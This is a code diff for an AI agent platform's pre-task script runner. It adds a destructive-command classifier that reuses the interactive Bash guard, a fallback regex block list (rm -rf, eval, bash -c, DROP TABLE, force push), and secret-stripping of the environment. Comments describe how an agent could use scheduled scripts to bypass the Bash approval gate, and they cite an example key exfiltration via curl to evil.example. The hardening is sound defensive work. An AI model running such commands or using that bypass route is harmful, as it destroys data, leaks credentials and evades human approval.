@@ -3,6 +3,7 @@ import fs from 'node:fs';
 import path from 'node:path';
 import type { MessageInRow } from '../db/messages-in.js';
 import { touchHeartbeat } from '../db/connection.js';
+import { buildSecretEnvVarList, MCP_HEADER_ONLY_SECRET_VARS } from '../providers/secret-env.js';
 
 const SCRIPT_TIMEOUT_MS = 30_000;
 const SCRIPT_MAX_BUFFER = 1024 * 1024;
@@ -16,6 +17,84 @@ function log(msg: string): void {
   console.error(`[task-script] ${msg}`);
 }
 
+// ── Destructive-command classifier (fleet-hardening Phase 4, P1 leg 2) ────────
+// A pre-task script runs unattended, pre-turn, with no approval round-trip —
+// so `ncl tasks create --script` (access:'open') was an ungated bash-exec path
+// that let an agent do what the interactive Bash gate would have blocked. Fix:
+// run the script through the SAME evaluator the interactive Bash PreToolUse
+// hook uses (claude.ts loadCoreEvaluator → block-destructive-core), and refuse
+// anything it would block OR gate. Reusing the core (not a private regex) means
+// this path inherits future matrix additions (e.g. P2 git history-mutation)
+// for free. Destructive work belongs inside the awakened turn, where the real
+// gate can card an approver.
+const DEFAULT_GUARD_CORE_PATH =
+  '/workspace/plugins/bootstrap/plugins/workflow-agents/hooks/guards/block-destructive-core.ts';
+type BashEvaluator = (
+  command: string,
+  opts?: { skipGate?: boolean },
+) => { action: 'allow' | 'block' | 'gate'; reason?: string };
+let _evalBash: BashEvaluator | null | undefined;
+async function loadBashEvaluator(): Promise<BashEvaluator | null> {
+  if (_evalBash !== undefined) return _evalBash;
+  const corePath = process.env.NANOCLAW_DESTRUCTIVE_GUARD_CORE || DEFAULT_GUARD_CORE_PATH;
+  try {
+    const core = (await import(corePath)) as Record<string, unknown>;
+    const fn = core.evaluateBashCommand;
+    _evalBash = typeof fn === 'function' ? (fn as BashEvaluator) : null;
+  } catch {
+    _evalBash = null;
+  }
+  return _evalBash;
+}
+
+// Fail-closed fallback for a plugin-less install / a core that fails to import:
+// the egregious hard-block set, same shape as the host-side classifier
+// (src/modules/scheduling/host-script.ts). ponytail: intentionally narrow —
+// the mounted core above is the source of truth and is present in every
+// production container (every Bash command depends on it); this only backstops
+// its absence so the refusal never silently fails open.
+const FALLBACK_BLOCK: RegExp[] = [
+  /\brm\s+(?:-\w*[rf]\w*\s+)+/i,
+  /\b(?:unlink|shred|truncate)\b/i,
+  /\beval\b/i,
+  /\b(?:bash|sh|zsh|dash|ksh)\s+-c\b/i,
+  /\bdd\s+[\s\S]*\bif=/i,
+  /\b(?:DROP|TRUNCATE)\s+(?:TABLE|SCHEMA|DATABASE|VIEW|INDEX)\b/i,
+  /\bDELETE\s+FROM\b/i,
+  /\bgit\s+push\s+(?:\S+\s+)*(?:--force|-f)\b/i,
+];
+
+/** Refuse a pre-task script the interactive Bash gate would block or gate. */
+export async function classifyScript(script: string): Promise<{ safe: boolean; reason?: string }> {
+  const evaluate = await loadBashEvaluator();
+  if (evaluate) {
+    try {
+      const v = evaluate(script);
+      if (v?.action === 'block' || v?.action === 'gate') return { safe: false, reason: v.reason ?? v.action };
+      return { safe: true };
+    } catch {
+      /* core threw — fall through to the fail-closed fallback */
+    }
+  }
+  const hit = FALLBACK_BLOCK.find((rx) => rx.test(script));
+  return hit ? { safe: false, reason: 'destructive command (fallback classifier)' } : { safe: true };
+}
+
+/**
+ * Env for a pre-task subprocess — parity with the interactive Bash sanitize
+ * hook (claude.ts createSanitizeBashHook + secret-env.ts). Strips the
+ * always-unset auth secrets and the MCP header-only secrets so a scheduled
+ * `curl -d "$ANTHROPIC_API_KEY" evil.example` exfil (which the classifier
+ * ALLOWS — it's a plain curl) reads an empty value. Data-tool creds and the
+ * OneCLI proxy vars stay, so credentialed monitor scripts keep working.
+ */
+function scriptEnv(): NodeJS.ProcessEnv {
+  const strip = new Set([...buildSecretEnvVarList(), ...MCP_HEADER_ONLY_SECRET_VARS]);
+  const env: NodeJS.ProcessEnv = {};
+  for (const [k, v] of Object.entries(process.env)) if (!strip.has(k)) env[k] = v;
+  return env;
+}
+
 export async function runScript(script: string, taskId: string): Promise<ScriptResult | null> {
   const scriptPath = path.join('/tmp', `task-script-${taskId}.sh`);
   fs.writeFileSync(scriptPath, script, { mode: 0o755 });
@@ -24,7 +103,7 @@ export async function runScript(script: string, taskId: string): Promise<ScriptR
     execFile(
       'bash',
       [scriptPath],
-      { timeout: SCRIPT_TIMEOUT_MS, maxBuffer: SCRIPT_MAX_BUFFER, env: process.env },
+      { timeout: SCRIPT_TIMEOUT_MS, maxBuffer: SCRIPT_MAX_BUFFER, env: scriptEnv() },
       (error, stdout, stderr) => {
         try {
           fs.unlinkSync(scriptPath);
@@ -64,8 +143,12 @@ export async function runScript(script: string, taskId: string): Promise<ScriptR
   });
 }
 
-/** Why a script gated its task: deliberate wakeAgent=false vs a broken script. */
-export type ScriptSkipReason = 'gated' | 'error';
+/**
+ * Why a script gated its task: deliberate wakeAgent=false vs a broken script vs
+ * a destructive script the classifier refused to run. 'blocked' acks like
+ * 'error' (backoff) so a misconfigured/hostile series throttles itself.
+ */
+export type ScriptSkipReason = 'gated' | 'error' | 'blocked';
 
 export interface TaskScriptOutcome {
   keep: MessageInRow[];
@@ -115,6 +198,13 @@ export async function applyPreTaskScripts(messages: MessageInRow[]): Promise<Tas
     // scriptOutput and reaches the normal execution path below.
     if (content.scriptOutput !== undefined) {
       keep.push(msg);
+      continue;
+    }
+
+    const verdict = await classifyScript(script);
+    if (!verdict.safe) {
+      log(`task ${msg.id} BLOCKED: destructive pre-task script refused — ${verdict.reason}`);
+      skipped.push({ id: msg.id, reason: 'blocked' });
       continue;
     }
 
